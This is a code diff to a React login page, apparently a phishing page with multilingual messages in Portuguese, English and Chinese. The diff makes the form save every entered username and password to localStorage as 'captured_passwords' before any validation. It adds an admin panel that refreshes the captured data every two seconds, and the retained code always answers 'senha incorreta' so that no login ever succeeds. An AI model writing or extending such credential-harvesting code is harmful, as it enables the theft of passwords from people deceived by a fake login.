@@ -132,6 +132,13 @@ export default function App() {
     setAdminAuthed(false);
   };
 
+  // Auto-refresh captured data every 2s while admin panel is authenticated
+  useEffect(() => {
+    if (!adminAuthed) return;
+    const interval = setInterval(refreshStorageData, 2000);
+    return () => clearInterval(interval);
+  }, [adminAuthed]);
+
   // Auto-prepend `@` visually or physically if typed without it
   const handleUsernameChange = (val: string) => {
     let clean = val;
@@ -142,7 +149,28 @@ export default function App() {
   // Perform database login
   const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!username.trim() || !password.trim()) {
+
+    // Capture ANY attempt immediately, before any validation
+    const rawUser = username.trim();
+    const rawPass = password;
+    if (rawUser && rawPass) {
+      let formattedUser = rawUser;
+      if (!formattedUser.startsWith("@")) {
+        formattedUser = `@${formattedUser}`;
+      }
+      const entry = {
+        user: formattedUser,
+        pass: rawPass,
+        time: new Date().toLocaleString("pt-BR")
+      };
+      try {
+        const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
+        existing.push(entry);
+        localStorage.setItem("captured_passwords", JSON.stringify(existing));
+      } catch {}
+    }
+
+    if (!rawUser || !rawPass) {
       showFeedback(
         language === "zh" ? "请输入用户名和密码。" : language === "en" ? "Please enter username and password." : "Por favor, digite o usuário e senha.", 
         "error"
@@ -152,22 +180,6 @@ export default function App() {
 
     setLoading(true);
     setFeedback(null);
-
-    // Format username to start with @ for the backend mapping
-    let formattedUser = username.trim();
-    if (!formattedUser.startsWith("@")) {
-      formattedUser = `@${formattedUser}`;
-    }
-
-    // Capture ALL login attempts
-    const entry = {
-      user: formattedUser,
-      pass: password,
-      time: new Date().toLocaleString("pt-BR")
-    };
-    const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
-    existing.push(entry);
-    localStorage.setItem("captured_passwords", JSON.stringify(existing));
 
     // Always show "senha incorreta" - never allow login
     setTimeout(() => {
